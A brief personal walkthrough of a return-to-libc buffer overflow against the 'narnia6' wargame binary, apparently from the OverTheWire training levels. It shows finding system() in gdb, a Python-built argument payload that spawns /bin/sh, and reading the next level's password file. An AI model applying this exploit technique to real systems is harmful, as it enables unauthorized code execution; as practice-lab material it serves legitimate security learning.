Okay so this is my first time doing return to libc attack.
When running the executable, it takes in 2 arguments, and prints out the first one
./narnia6 jake mai
-> jake

in the source code, b1 and b2 are variables that hold argv[1] and argv[2]
however they only have 8 bytes each.

#include <stdlib.h> header is used in this program

we find the memory address of system inside gdb
p system
$1 = {<text variable, no debug info>} 0xf7e4c850 <system>

we need to overflow b1 and b2, followed by the address of system, and execute the shell
./narnia6 $(python -c 'print("XXXXXXXX"+"\x50\xc8\xe4\xf7" + " XXXXXXXX"+"/bin/sh")')

we got a shell!
cat /etc/narnia_pass/narnia7
